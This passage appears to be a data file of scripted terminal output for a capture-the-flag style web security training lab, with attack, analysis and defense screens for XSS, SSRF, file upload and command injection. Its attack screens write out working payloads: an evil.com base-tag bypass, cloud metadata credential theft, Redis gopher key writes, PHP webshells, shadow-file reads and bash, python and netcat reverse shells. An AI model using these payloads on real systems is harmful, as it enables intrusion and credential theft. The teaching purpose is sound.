        { text: "", type: "system" },
        { text: "[ATK] Bypass 2: script-src 'unsafe-inline' (if present)", type: "info" },
        { text: "[ATK] <script>alert(document.cookie)</script>", type: "warning" },
        { text: "[ATK] ✓ Direct inline script works when 'unsafe-inline' is in CSP", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 3: base-uri misconfiguration", type: "info" },
        { text: "[ATK] <base href=\"https://evil.com/\">", type: "warning" },
        { text: "[ATK] ✓ All relative script src now load from attacker domain", type: "error" },
        { text: "", type: "system" },
        { text: "[AI] CSP is defense-in-depth, not a complete XSS solution", type: "ai" },
        { text: "[AI] Strict CSP: script-src 'nonce-{random}' or 'strict-dynamic'", type: "ai" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running XSS vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌──────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │             Vulnerability Assessment Report             │", type: "ai" },
        { text: "[AI] ├──────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ Reflected XSS   : HIGH     (7.5) — Session hijack    │", type: "warning" },
        { text: "[AI] │ Stored XSS      : CRITICAL (9.0) — Mass compromise   │", type: "error" },
        { text: "[AI] │ DOM-based XSS   : HIGH     (8.2) — WAF bypass        │", type: "warning" },
        { text: "[AI] │ CSP Misconfig   : MEDIUM   (5.5) — Bypass possible   │", type: "info" },
        { text: "[AI] │ mXSS            : HIGH     (7.8) — Sanitizer bypass  │", type: "warning" },
        { text: "[AI] └──────────────────────────────────────────────────────┘", type: "ai" },
        { text: "[AI] Fix priority: Stored XSS → DOM XSS → Reflected XSS → CSP", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ XSS Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] 1. Output Encoding (context-aware):", type: "success" },
        { text: "[DEF]    HTML body: &lt;script&gt; → entity encoding", type: "success" },
        { text: "[DEF]    HTML attribute: \" → &quot; encoding", type: "success" },
        { text: "[DEF]    JavaScript: Unicode escape \\u003c", type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] 2. Content Security Policy (CSP):", type: "info" },
        { text: "[DEF]    Content-Security-Policy: script-src 'nonce-{random}'; object-src 'none'", type: "info" },
        { text: "[DEF]    Avoid: 'unsafe-inline', 'unsafe-eval'", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 3. Input Sanitization:", type: "info" },
        { text: "[DEF]    Server-side: DOMPurify (js), bleach (python), sanitize-html (node)", type: "info" },
        { text: "[DEF]    Never trust client-side validation alone", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 4. HttpOnly + Secure cookies:", type: "info" },
        { text: "[DEF]    Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ XSS Attack Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container:  RUNNING (xss-lab-{CONTAINER_ID})", type: "success" },
        { text: "[STATUS]   Target:     10.0.3.{LAB_IP} (Node.js/Express Blog)", type: "info" },
        { text: "[STATUS]   DB:         MongoDB 5.0 (comments collection: 47 docs)", type: "info" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
        { text: "[STATUS]   Isolation:  ENFORCED", type: "success" },
      ],
    },
  },

  ssrf: {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ SSRF Lab — Available Commands                      │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Port scan & service discovery      │", type: "info" },
        { text: "│  internal   — Access internal services           │", type: "warning" },
        { text: "│  cloud      — Cloud metadata extraction          │", type: "warning" },
        { text: "│  redis      — Redis SSRF exploitation            │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis          │", type: "ai" },
        { text: "│  defend     — Show defense & remediation         │", type: "ai" },
        { text: "│  status     — Lab environment status             │", type: "info" },
        { text: "│  clear      — Clear terminal                     │", type: "system" },
        { text: "│  exit       — Terminate lab session              │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
        { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
        { text: "[SCAN] PORT      STATE   SERVICE       VERSION", type: "system" },
        { text: "[SCAN] 22/tcp    open    ssh           OpenSSH 8.2", type: "success" },
        { text: "[SCAN] 5000/tcp  open    http          Flask/Python 3.9", type: "success" },
        { text: "[SCAN] 9000/tcp  open    http          MinIO S3 API", type: "warning" },
        { text: "[SCAN] 6379/tcp  open    redis         Redis 6.2", type: "warning" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Flask app endpoint: /api/fetch?url=<input>", type: "info" },
        { text: "[AI] SSRF candidate: URL fetcher with internal network access", type: "ai" },
      ],
    },
    internal: {
      lines: [
        { text: "[ATK] Internal Service Scanning via SSRF", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Enumerate internal hosts", type: "info" },
        { text: "[ATK] GET /api/fetch?url=http://10.0.3.200:9000/minio/health/live", type: "warning" },
        { text: "[ATK] Response: 200 OK → MinIO S3 is reachable from server", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: List S3 buckets", type: "info" },
        { text: "[ATK] GET /api/fetch?url=http://10.0.3.200:9000", type: "warning" },
        { text: "[ATK] Response: <Buckets><Name>customer-data</Name><Name>secrets</Name>...", type: "error" },
        { text: "[ATK] ✓ S3 buckets exposed: customer-data, secrets, backups", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Read secrets bucket", type: "info" },
        { text: "[ATK] GET /api/fetch?url=http://10.0.3.200:9000/secrets/aws-credentials.txt", type: "warning" },
        { text: "[ATK] [DEFAULT] aws_access_key_id = AKIA3EXAMPLE...", type: "error" },
        { text: "[ATK] [DEFAULT] aws_secret_access_key = wJalrXUtnFEMI/K7...", type: "error" },
        { text: "[ATK] ✓ AWS credentials exfiltrated via SSRF chain", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  SSRF INTERNAL — FLAG CAPTURED                    ║", type: "success" },
        { text: "║   FLAG: CV{ssrf_1nt3rn4l_s3_cr3d_l34k}               ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    cloud: {
      lines: [
        { text: "[ATK] Cloud Metadata Extraction via SSRF", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] AWS Metadata (IMDSv1 — no auth required):", type: "info" },
        { text: "[ATK] GET /api/fetch?url=http://169.254.169.254/latest/meta-data/", type: "warning" },
        { text: "[ATK] Response: ami-id, hostname, iam/, instance-type, local-ipv4...", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Get IAM role credentials", type: "info" },
        { text: "[ATK] GET .../latest/meta-data/iam/security-credentials/", type: "warning" },
        { text: "[ATK] Role: ecs-task-role", type: "success" },
        { text: "[ATK] GET .../latest/meta-data/iam/security-credentials/ecs-task-role", type: "warning" },
        { text: "[ATK] { \"AccessKeyId\": \"ASIAR...\", \"SecretAccessKey\": \"wJalrX...\", \"Token\": \"IQoJb3J...\" }", type: "error" },
        { text: "[ATK] ✓ Temporary IAM credentials stolen — valid for 6 hours", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Check IMDSv2 protection", type: "info" },
        { text: "[ATK] PUT /api/fetch?url=http://169.254.169.254/latest/api/token", type: "warning" },
        { text: "[ATK] Response: IMDSv2 token endpoint accessible — but needs PUT", type: "warning" },
        { text: "[ATK] SSRF only supports GET → IMDSv2 partially blocks this attack", type: "success" },
        { text: "", type: "system" },
        { text: "[AI] Always enforce IMDSv2 — it requires a PUT token header", type: "ai" },
        { text: "[AI] IMDSv1 is deprecated and should be disabled on all EC2 instances", type: "ai" },
      ],
    },
    redis: {
      lines: [
        { text: "[ATK] Redis SSRF Exploitation", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Check Redis connectivity via SSRF", type: "info" },
        { text: "[ATK] GET /api/fetch?url=gopher://10.0.3.201:6379/_INFO", type: "warning" },
        { text: "[ATK] Response: Redis v6.2.6, db0:keys=23, connected_clients=5", type: "success" },
        { text: "[ATK] ✓ Redis has NO authentication (requirepass is empty)", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Write SSH authorized_keys via Redis", type: "info" },
        { text: "[ATK] gopher://10.0.3.201:6379/_CONFIG SET dir /root/.ssh/", type: "warning" },
        { text: "[ATK] gopher://10.0.3.201:6379/_CONFIG SET dbfilename authorized_keys", type: "warning" },
        { text: "[ATK] gopher://10.0.3.201:6379/_SET x '\\nssh-rsa AAAA...attacker@kali\\n'", type: "warning" },
        { text: "[ATK] gopher://10.0.3.201:6379/_SAVE", type: "warning" },
        { text: "[ATK] ✓ SSH public key written to Redis host", type: "error" },
        { text: "[ATK] ssh -i id_rsa root@10.0.3.201 → root shell obtained", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  SSRF+REDIS RCE — FLAG CAPTURED                   ║", type: "success" },
        { text: "║   FLAG: CV{ssrf_r3d1s_g0ph3r_rc3_ch41n}              ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running SSRF vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌──────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │             Vulnerability Assessment Report             │", type: "ai" },
        { text: "[AI] ├──────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ Basic SSRF       : HIGH     (8.6) — Internal scan     │", type: "warning" },
        { text: "[AI] │ Cloud Metadata   : CRITICAL (9.1) — Credential theft  │", type: "error" },
        { text: "[AI] │ Redis SSRF       : CRITICAL (9.8) — RCE via gopher    │", type: "error" },
        { text: "[AI] │ Blind SSRF       : MEDIUM   (5.3) — Limited impact   │", type: "info" },
        { text: "[AI] └──────────────────────────────────────────────────────┘", type: "ai" },
        { text: "[AI] Attack chain: SSRF → Redis unauth → SSH key write → RCE", type: "ai" },
        { text: "[AI] Critical: No URL validation + gopher protocol enabled", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ SSRF Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] 1. URL Allowlisting:", type: "success" },
        { text: "[DEF]    Only allow specific domains (e.g., external-image-cdn.com)", type: "success" },
        { text: "[DEF]    Block: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16", type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] 2. Disable dangerous protocols:", type: "info" },
        { text: "[DEF]    Block: gopher://, file://, dict://, ftp://, ldap://", type: "info" },
        { text: "[DEF]    Only allow: http:// and https://", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 3. Cloud-specific (AWS):", type: "info" },
        { text: "[DEF]    Enforce IMDSv2: aws ec2 modify-instance-metadata-options --http-tokens required", type: "info" },
        { text: "[DEF]    Use IAM roles for Service Accounts (IRSA) instead of instance profiles", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 4. Network segmentation:", type: "info" },
        { text: "[DEF]    Application servers should NOT reach internal databases directly", type: "info" },
        { text: "[DEF]    Redis: requirepass your_strong_password", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ SSRF Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container:  RUNNING (ssrf-lab-{CONTAINER_ID})", type: "success" },
        { text: "[STATUS]   Target:     10.0.3.{LAB_IP} (Flask/URL Preview)", type: "info" },
        { text: "[STATUS]   Internal:   10.0.3.200 (MinIO) / 10.0.3.201 (Redis)", type: "info" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
      ],
    },
  },

  upload: {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ File Upload Lab — Available Commands               │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Port scan & web fingerprint       │", type: "info" },
        { text: "│  bypass     — Extension bypass techniques        │", type: "warning" },
        { text: "│  webshell   — Webshell upload & execution        │", type: "warning" },
        { text: "│  race       — Race condition exploitation        │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis          │", type: "ai" },
        { text: "│  defend     — Show defense & remediation         │", type: "ai" },
        { text: "│  status     — Lab environment status             │", type: "info" },
        { text: "│  clear      — Clear terminal                     │", type: "system" },
        { text: "│  exit       — Terminate lab session              │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
        { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
        { text: "[SCAN] PORT      STATE   SERVICE       VERSION", type: "system" },
        { text: "[SCAN] 22/tcp    open    ssh           OpenSSH 7.9", type: "success" },
        { text: "[SCAN] 80/tcp    open    http          Apache 2.4.49", type: "success" },
        { text: "[SCAN] 443/tcp   open    https         Apache 2.4.49", type: "success" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Upload endpoint: /upload.php (POST multipart/form-data)", type: "info" },
        { text: "[SCAN] Upload dir: /uploads/ (Apache + PHP executable)", type: "warning" },
        { text: "[AI] Critical: Upload directory has PHP execution enabled", type: "ai" },
      ],
    },
    bypass: {
      lines: [
        { text: "[ATK] File Upload Bypass Techniques", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 1: Double extension", type: "info" },
        { text: "[ATK] Filename: shell.php.jpg → Server parses as .php (misconfig)", type: "warning" },
        { text: "[ATK] ✓ Uploaded: /uploads/shell.php.jpg → executes PHP", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 2: Null byte injection (PHP < 5.3.4)", type: "info" },
        { text: "[ATK] Filename: shell.php%00.jpg → Server truncates at null byte", type: "warning" },
        { text: "[ATK] ✓ File saved as shell.php", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 3: .htaccess override", type: "info" },
        { text: "[ATK] Upload .htaccess: AddType application/x-httpd-php .jpg", type: "warning" },
        { text: "[ATK] ✓ Now all .jpg files in directory execute as PHP", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 4: MIME type spoofing", type: "info" },
        { text: "[ATK] Content-Type: image/jpeg (but body contains PHP code)", type: "warning" },
        { text: "[ATK] ✓ Server only checks Content-Type header, not file content", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 5: Magic bytes (polyglot file)", type: "info" },
        { text: "[ATK] Prepend: \\xFF\\xD8\\xFF\\xE0 (JPEG header) + <?php system($_GET['c']); ?>", type: "warning" },
        { text: "[ATK] ✓ File passes magic byte check AND executes as PHP", type: "error" },
      ],
    },
    webshell: {
      lines: [
        { text: "[ATK] Webshell Upload & Execution", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Craft PHP webshell", type: "info" },
        { text: "[ATK] Payload: <?php @eval($_POST['cmd']); ?>", type: "warning" },
        { text: "[ATK] Filename: image.php (using extension bypass from earlier)", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Upload via multipart POST", type: "info" },
        { text: "[ATK] curl -X POST -F 'file=@image.php;type=image/jpeg' http://10.0.3.{LAB_IP}/upload.php", type: "warning" },
        { text: "[ATK] Response: File uploaded successfully → /uploads/image.php", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Execute commands", type: "info" },
        { text: "[ATK] curl http://10.0.3.{LAB_IP}/uploads/image.php -d 'cmd=whoami'", type: "warning" },
        { text: "[ATK] Response: www-data", type: "success" },
        { text: "[ATK] curl http://10.0.3.{LAB_IP}/uploads/image.php -d 'cmd=cat+/etc/passwd'", type: "warning" },
        { text: "[ATK] Response: root:x:0:0:root:/root:/bin/bash", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 4: Reverse shell", type: "info" },
        { text: "[ATK] cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+10.0.3.99+4444+>/tmp/f", type: "warning" },
        { text: "[ATK] ✓ Reverse shell connected → root@target:~#", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  WEBSHELL UPLOAD — FLAG CAPTURED                  ║", type: "success" },
        { text: "║   FLAG: CV{upl04d_byp4ss_w3bsh3ll_rc3}               ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    race: {
      lines: [
        { text: "[ATK] Race Condition in File Upload", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Vulnerable code pattern:", type: "info" },
        { text: "[ATK]   1. move_uploaded_file($_FILES['f']['tmp_name'], $dest)", type: "warning" },
        { text: "[ATK]   2. check_if_allowed_extension($dest)   // check AFTER move!", type: "error" },
        { text: "[ATK]   3. unlink($dest) if not allowed          // delete AFTER check", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Exploit: Upload shell.php → Access it BEFORE unlink() runs", type: "info" },
        { text: "[ATK] Thread 1: curl -X POST -F 'file=@shell.php' /upload.php  (loop)", type: "warning" },
        { text: "[ATK] Thread 2: curl http://target/uploads/shell.php           (loop)", type: "warning" },
        { text: "[ATK] ✓ Race won! PHP executed between move_uploaded_file and unlink", type: "error" },
        { text: "", type: "system" },
        { text: "[AI] Fix: Check extension BEFORE move_uploaded_file, or use random filenames", type: "ai" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running File Upload vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌──────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │             Vulnerability Assessment Report             │", type: "ai" },
        { text: "[AI] ├──────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ Extension Bypass  : CRITICAL (9.5) — Webshell upload  │", type: "error" },
        { text: "[AI] │ MIME Spoofing     : HIGH     (7.8) — Content check    │", type: "warning" },
        { text: "[AI] │ .htaccess Upload  : CRITICAL (9.8) — Config override  │", type: "error" },
        { text: "[AI] │ Race Condition    : HIGH     (8.2) — Timing window    │", type: "warning" },
        { text: "[AI] │ Exec Directory    : CRITICAL (9.0) — PHP in uploads/  │", type: "error" },
        { text: "[AI] └──────────────────────────────────────────────────────┘", type: "ai" ],
        { text: "[AI] Critical: Disable PHP execution in upload directories", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ File Upload Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] 1. Extension Whitelist (NOT blacklist):", type: "success" },
        { text: "[DEF]    Allow only: .jpg, .jpeg, .png, .gif, .pdf", type: "success" },
        { text: "[DEF]    Block all executable: .php, .phtml, .php5, .jsp, .asp, .aspx, .cgi", type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] 2. Content verification:", type: "info" },
        { text: "[DEF]    Verify magic bytes (file signature), not just Content-Type header", type: "info" },
        { text: "[DEF]    Use getimagesize() for image uploads — returns false for non-images", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 3. Disable execution in upload directory:", type: "info" },
        { text: "[DEF]    Apache: php_flag engine off (in .htaccess)", type: "info" },
        { text: "[DEF]    Nginx: location ^~ /uploads/ { default_type application/octet-stream; }", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 4. Rename files:", type: "info" },
        { text: "[DEF]    Generate random filenames: uuid4() + verified extension", type: "info" },
        { text: "[DEF]    Store uploads outside webroot when possible", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ File Upload Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container:  RUNNING (upload-lab-{CONTAINER_ID})", type: "success" },
        { text: "[STATUS]   Target:     10.0.3.{LAB_IP} (PHP/Apache File Share)", type: "info" },
        { text: "[STATUS]   Upload dir: /var/www/html/uploads/ (executable)", type: "warning" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
      ],
    },
  },

  rce: {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ Command Execution Lab — Available Commands         │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Port scan & service discovery      │", type: "info" },
        { text: "│  inject     — Command injection techniques       │", type: "warning" },
        { text: "│  filter     — Filter bypass methods              │", type: "warning" },
        { text: "│  reverse    — Reverse shell payloads             │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis          │", type: "ai" },
        { text: "│  defend     — Show defense & remediation         │", type: "ai" },
        { text: "│  status     — Lab environment status             │", type: "info" },
        { text: "│  clear      — Clear terminal                     │", type: "system" },
        { text: "│  exit       — Terminate lab session              │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
        { text: "[SCAN] Nmap 7.94 scan on 10.0.3.{LAB_IP}...", type: "info" },
        { text: "[SCAN] PORT      STATE   SERVICE       VERSION", type: "system" },
        { text: "[SCAN] 22/tcp    open    ssh           OpenSSH 8.2", type: "success" },
        { text: "[SCAN] 5000/tcp  open    http          Flask/Python 3.9", type: "success" },
        { text: "[SCAN]", type: "system" },
        { text: "[SCAN] Endpoint: /api/ping?host=<input>", type: "info" },
        { text: "[SCAN] Backend:  os.system('ping -c 3 ' + host)  ← VULNERABLE", type: "error" },
        { text: "[AI] Critical: User input directly passed to os.system()", type: "ai" },
      ],
    },
    inject: {
      lines: [
        { text: "[ATK] OS Command Injection Techniques", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 1: Confirm injection (command chaining)", type: "info" },
        { text: "[ATK] Payload: ; whoami", type: "warning" },
        { text: "[ATK] Request: /api/ping?host=127.0.0.1;whoami", type: "warning" },
        { text: "[ATK] Response: www-data  ← command executed!", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Step 2: Chaining operators", type: "info" },
        { text: "[ATK] ;  → sequential execution (whoami;id)", type: "info" },
        { text: "[ATK] |  → pipe output (| cat /etc/passwd)", type: "info" },
        { text: "[ATK] || → OR (failsafe: badcmd || whoami)", type: "info" },
        { text: "[ATK] && → AND (ping ok && cat /etc/shadow)", type: "info" },
        { text: "[ATK] $(command) → command substitution", type: "info" },
        { text: "[ATK] `command` → backtick substitution", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Step 3: Read sensitive files", type: "info" },
        { text: "[ATK] Payload: ; cat /etc/passwd", type: "warning" },
        { text: "[ATK] root:x:0:0:root:/root:/bin/bash", type: "error" },
        { text: "[ATK] www-data:x:33:33::/var/www:/usr/sbin/nologin", type: "error" },
        { text: "", type: "system" },
        { text: "[ATK] Step 4: Enumerate system", type: "info" },
        { text: "[ATK] Payload: ; cat /etc/shadow", type: "warning" },
        { text: "[ATK] root:$6$rounds=656000$salt$hash... (SHA-512)", type: "error" },
        { text: "[ATK] ✓ Shadow file readable — hash cracking possible", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  CMD INJECTION — FLAG CAPTURED                     ║", type: "success" },
        { text: "║   FLAG: CV{rc3_c0mm4nd_1nj3ct10n_sh4d0w}              ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    filter: {
      lines: [
        { text: "[ATK] Command Filter Bypass Techniques", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Blacklist blocks: ; | & ` $", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 1: Newline injection", type: "info" },
        { text: "[ATK] Payload: 127.0.0.1%0awhoami  (%0a = newline)", type: "warning" },
        { text: "[ATK] ✓ Newline acts as command separator", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 2: Variable concatenation", type: "info" },
        { text: "[ATK] Payload: w''hoami  (empty single quotes between chars)", type: "warning" },
        { text: "[ATK] Payload: w\\hoami   (backslash escape)", type: "warning" },
        { text: "[ATK] ✓ Shell interprets: whoami", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 3: Base64 encoding", type: "info" },
        { text: "[ATK] Payload: ; echo d2hvYW1p | base64 -d | bash", type: "warning" },
        { text: "[ATK] ✓ Decodes to 'whoami' and executes", type: "success" },
        { text: "", type: "system" },
        { text: "[ATK] Bypass 4: $PATH technique", type: "info" },
        { text: "[ATK] Payload: /???/??t /???/p??s??  → /bin/cat /etc/passwd", type: "warning" },
        { text: "[ATK] ✓ Glob pattern matching bypasses string filters", type: "error" },
      ],
    },
    reverse: {
      lines: [
        { text: "[ATK] Reverse Shell Payloads", type: "info" },
        { text: "", type: "system" },
        { text: "[ATK] Bash reverse shell:", type: "info" },
        { text: "[ATK] ; bash -i >& /dev/tcp/10.0.3.99/4444 0>&1", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Python reverse shell:", type: "info" },
        { text: "[ATK] ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.3.99\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Netcat reverse shell:", type: "info" },
        { text: "[ATK] ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.3.99 4444 >/tmp/f", type: "warning" },
        { text: "", type: "system" },
        { text: "[ATK] Attacker listener:", type: "info" },
        { text: "[ATK] $ nc -lvnp 4444", type: "info" },
        { text: "[ATK] Connection from 10.0.3.{LAB_IP}:38912!", type: "success" },
        { text: "[ATK] $ whoami → www-data", type: "success" },
        { text: "[ATK] ✓ Reverse shell obtained — interactive access to target", type: "error" },
        { text: "", type: "system" },
        { text: "╔═══════════════════════════════════════════════════════╗", type: "success" },
        { text: "║   ✓  REVERSE SHELL — FLAG CAPTURED                     ║", type: "success" },
        { text: "║   FLAG: CV{rc3_r3v3rs3_sh3ll_4cc3ss}                  ║", type: "success" },
        { text: "╚═══════════════════════════════════════════════════════╝", type: "success" },
      ],
    },
    analyze: {
      lines: [
        { text: "[AI] Running Command Execution vulnerability analysis...", type: "ai" },
        { text: "[AI] ┌──────────────────────────────────────────────────────┐", type: "ai" },
        { text: "[AI] │             Vulnerability Assessment Report             │", type: "ai" },
        { text: "[AI] ├──────────────────────────────────────────────────────┤", type: "ai" },
        { text: "[AI] │ OS Command Inj.   : CRITICAL (9.8) — RCE via os.system│", type: "error" },
        { text: "[AI] │ Filter Bypass     : HIGH     (8.5) — Encoding tricks   │", type: "warning" },
        { text: "[AI] │ Reverse Shell     : CRITICAL (9.6) — Full system access│", type: "error" },
        { text: "[AI] │ Privilege Escal.  : HIGH     (7.2) — Kernel exploit    │", type: "warning" },
        { text: "[AI] └──────────────────────────────────────────────────────┘", type: "ai" },
        { text: "[AI] Root cause: os.system() with unsanitized user input", type: "ai" },
        { text: "[AI] Fix: Use subprocess.run() with shell=False + input list", type: "ai" },
      ],
    },
    defend: {
      lines: [
        { text: "[AI] ═══ Command Injection Defense & Remediation ═══", type: "ai" },
        { text: "", type: "system" },
        { text: "[DEF] 1. Never use os.system() with user input:", type: "success" },
        { text: "[DEF]    BAD:  os.system('ping -c 3 ' + user_input)", type: "error" },
        { text: "[DEF]    GOOD: subprocess.run(['ping', '-c', '3', user_input], shell=False)", type: "success" },
        { text: "", type: "system" },
        { text: "[DEF] 2. Input validation (whitelist):", type: "info" },
        { text: "[DEF]    Only allow: valid IP addresses or hostnames (regex: ^[a-zA-Z0-9.-]+$)", type: "info" ],
        { text: "[DEF]    Reject ALL special characters: ; | & ` $ ( ) { } < > \\n", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 3. Principle of least privilege:", type: "info" },
        { text: "[DEF]    Run web app as non-root user (www-data / nobody)", type: "info" },
        { text: "[DEF]    Use chroot / containers / seccomp for isolation", type: "info" },
        { text: "", type: "system" },
        { text: "[DEF] 4. Use language-native APIs instead of shell commands:", type: "info" },
        { text: "[DEF]    DNS lookup: socket.getaddrinfo() instead of nslookup", type: "info" },
        { text: "[DEF]    Ping: Use icmplib or pythonping instead of os.system('ping')", type: "info" },
      ],
    },
    status: {
      lines: [
        { text: "[STATUS] ═══ Command Execution Lab Environment ═══", type: "info" },
        { text: "[STATUS]   Container:  RUNNING (rce-lab-{CONTAINER_ID})", type: "success" },
        { text: "[STATUS]   Target:     10.0.3.{LAB_IP} (Flask Network Tool)", type: "info" },
        { text: "[STATUS]   Vuln API:   /api/ping, /api/lookup", type: "info" },
        { text: "[STATUS]   AI Engine:  CyberShield-v3 ACTIVE", type: "ai" },
      ],
    },
  },

  "cve-sim": {
    help: {
      lines: [
        { text: "┌──────────────────────────────────────────────────┐", type: "system" },
        { text: "│ CVE Simulation Lab — Available Commands             │", type: "system" },
        { text: "├──────────────────────────────────────────────────┤", type: "system" },
        { text: "│  scan       — Scan target infrastructure          │", type: "info" },
        { text: "│  log4shell  — CVE-2021-44228 exploit demo        │", type: "warning" },
        { text: "│  spring4    — CVE-2022-22965 exploit demo        │", type: "warning" },
        { text: "│  analyze    — AI vulnerability analysis          │", type: "ai" },
        { text: "│  defend     — Show defense & remediation         │", type: "ai" },
        { text: "│  status     — Lab environment status             │", type: "info" },
        { text: "│  clear      — Clear terminal                     │", type: "system" },
        { text: "│  exit       — Terminate lab session              │", type: "error" },
        { text: "└──────────────────────────────────────────────────┘", type: "system" },
      ],
    },
    scan: {
      lines: [
